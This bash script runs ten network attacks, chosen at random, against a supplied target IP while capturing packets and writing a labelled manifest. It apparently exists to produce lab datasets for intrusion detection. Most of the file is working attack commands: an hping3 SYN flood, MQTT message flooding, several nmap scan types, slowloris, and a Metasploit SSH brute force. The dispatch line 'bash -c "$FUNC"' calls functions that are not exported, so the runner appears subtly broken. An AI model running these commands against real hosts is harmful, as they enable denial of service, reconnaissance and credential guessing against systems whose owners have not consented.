#!/usr/bin/env bash
# random_attacks.sh - focused attack runner (safe, lab-only)
# Usage: ./random_attacks.sh <TARGET_IP> [OUTDIR] [IFACE]
# Example: ./random_attacks.sh 192.168.107.10 ./captures eth1

set -euo pipefail

TARGET_IP=${1:-}
OUTDIR=${2:-"./attack_run_$(date +%Y%m%d_%H%M%S)"}
IFACE=${3:-"eth1"}
ATTACK_DURATION=${ATTACK_DURATION:-30}
MANIFEST="$OUTDIR/manifest.csv"
PCAP="$OUTDIR/capture.pcap"

if [[ -z "$TARGET_IP" ]]; then
  echo "Usage: $0 <TARGET_IP> [OUTDIR] [IFACE]"
  exit 2
fi

mkdir -p "$OUTDIR"

REQ=( tcpdump hping3 mosquitto_pub nmap slowhttptest msfconsole )
for t in "${REQ[@]}"; do
  if ! command -v "$t" >/dev/null 2>&1; then
    echo "Warning: $t not found. Attacks needing it may be skipped: $t"
  fi
done

echo "Starting packet capture on $IFACE for host $TARGET_IP -> $PCAP"
sudo tcpdump -i "$IFACE" host "$TARGET_IP" -w "$PCAP" &
TCPDUMP_PID=$!
sleep 1

echo "experiment_id,start_time_iso,end_time_iso,attack_label,command,notes" > "$MANIFEST"

EXPID=$(date +%s)

# Attack labels
POOL=(
  "DOS_SYN_hping"
  "MQTT_Publish"
  "NMAP_UDP_SCAN"
  "NMAP_XMAS_TREE_SCAN"
  "NMAP_OS_DETECTION"
  "NMAP_TCP_scan"
  "DDOS_Slowloris"
  "metasploit_Brute_force_SSH"
  "NMAP_FIN_SCAN"
)

attack_DOS_SYN_hping() {
  sudo timeout ${ATTACK_DURATION} hping3 -S "$TARGET_IP" -p 80 -i u1000 >/dev/null 2>&1 || true
}

attack_MQTT_Publish() {
  local COUNT=100
  local INTERVAL
  INTERVAL=$(awk "BEGIN {print ${ATTACK_DURATION}/${COUNT}}")
  for i in $(seq 1 $COUNT); do
    mosquitto_pub -h "$TARGET_IP" -t "test/topic" -m "msg${i}" 2>/dev/null || true
    sleep "$INTERVAL"
  done
}

attack_NMAP_UDP_SCAN() {
  timeout ${ATTACK_DURATION} nmap -sU --top-ports 100 -T4 "$TARGET_IP" >/dev/null 2>&1 || true
}

attack_NMAP_XMAS_TREE_SCAN() {
  timeout ${ATTACK_DURATION} nmap -sX -p 1-200 -T4 "$TARGET_IP" >/dev/null 2>&1 || true
}

attack_NMAP_OS_DETECTION() {
  timeout ${ATTACK_DURATION} nmap -sV -O -p 22,80,443 --max-retries 1 "$TARGET_IP" >/dev/null 2>&1 || true
}

attack_NMAP_TCP_scan() {
  timeout ${ATTACK_DURATION} nmap -sT --top-ports 200 -T4 "$TARGET_IP" >/dev/null 2>&1 || true
}

attack_DDOS_Slowloris() {
  if command -v slowhttptest >/dev/null 2>&1; then
    slowhttptest -c 50 -H -g -i 5 -t ${ATTACK_DURATION} -u "http://${TARGET_IP}/" >/dev/null 2>&1 || true
  else
    for i in $(seq 1 10); do
      curl -s -N "http://${TARGET_IP}/" --keepalive-time 60 >/dev/null 2>&1 || true
      sleep 1
    done
  fi
}

attack_metasploit_Brute_force_SSH() {
  if ! command -v msfconsole >/dev/null 2>&1; then return 0; fi
  local TMPUSR="$OUTDIR/tmp_users.txt"
  local TMPPASS="$OUTDIR/tmp_pass.txt"
  echo "testuser" > "$TMPUSR"
  echo "password123" > "$TMPPASS"
  local MSF_CMD="use auxiliary/scanner/ssh/ssh_login; set RHOSTS ${TARGET_IP}; set USER_FILE ${TMPUSR}; set PASS_FILE ${TMPPASS}; set THREADS 2; run; exit -y"
  timeout ${ATTACK_DURATION} msfconsole -q -x "$MSF_CMD" >/dev/null 2>&1 || true
}

attack_NMAP_FIN_SCAN() {
  timeout ${ATTACK_DURATION} nmap -sF -p 1-200 -T4 "$TARGET_IP" >/dev/null 2>&1 || true
}

declare -A FUNCMAP
FUNCMAP=(
  ["DOS_SYN_hping"]=attack_DOS_SYN_hping
  ["MQTT_Publish"]=attack_MQTT_Publish
  ["NMAP_UDP_SCAN"]=attack_NMAP_UDP_SCAN
  ["NMAP_XMAS_TREE_SCAN"]=attack_NMAP_XMAS_TREE_SCAN
  ["NMAP_OS_DETECTION"]=attack_NMAP_OS_DETECTION
  ["NMAP_TCP_scan"]=attack_NMAP_TCP_scan
  ["DDOS_Slowloris"]=attack_DDOS_Slowloris
  ["metasploit_Brute_force_SSH"]=attack_metasploit_Brute_force_SSH
  ["NMAP_FIN_SCAN"]=attack_NMAP_FIN_SCAN
)

SELECTED=()
POOLSIZE=${#POOL[@]}
while [ ${#SELECTED[@]} -lt 10 ]; do
  IDX=$((RANDOM % POOLSIZE))
  SELECTED+=("${POOL[$IDX]}")
done

echo "Planned attacks: ${SELECTED[*]}"
sleep 1

for label in "${SELECTED[@]}"; do
  FUNC=${FUNCMAP[$label]}
  START=$(date --iso-8601=seconds)
  echo "[$START] Starting attack: $label"
  timeout ${ATTACK_DURATION} bash -c "$FUNC" >/dev/null 2>&1 || true
  END=$(date --iso-8601=seconds)
  echo "${EXPID},${START},${END},${label},\"${FUNC}\",\"duration_s=${ATTACK_DURATION}\"" >> "$MANIFEST"
  sleep 2
done

sleep 1
sudo kill "$TCPDUMP_PID" || true
wait "$TCPDUMP_PID" 2>/dev/null || true

echo "Done. PCAP: $PCAP"
echo "Manifest: $MANIFEST"
